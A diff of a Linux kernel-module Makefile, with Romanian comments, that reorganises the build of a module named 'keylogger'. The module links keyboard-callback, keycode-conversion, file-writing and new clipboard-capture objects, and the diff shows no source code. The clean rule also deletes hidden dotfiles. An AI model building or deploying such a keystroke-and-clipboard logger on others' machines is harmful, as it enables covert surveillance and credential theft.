@@ -1,13 +1,13 @@
-obj-m := init.o flush.o keyboard_callback.o keycode_to_string.o write_to_file.o
+obj-m := keylogger.o
 
-# Directorul curent de lucru
-COMPILE_DIR := $(shell pwd)
+# Lista fișierelor sursă pentru modul
+keylogger-objs :=init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o clipboard_callback.o write_to_file_clipboard.o flush_clipboard.o
 
-# Calea către kernel headers pentru versiunea curentă a kernelului
+COMPILE_DIR := $(PWD)
 KDIR := /lib/modules/$(shell uname -r)/build
 
 all:
 	$(MAKE) -C $(KDIR) M=$(COMPILE_DIR) modules
 
 clean:
-	rm -f -v *.o *.ko *.mod. .*.cmd *.symvers *.order
+	rm -f -v *.o *.ko *.mod *.cmd *.symvers *.markers .* keylogger.mod.c modules.order
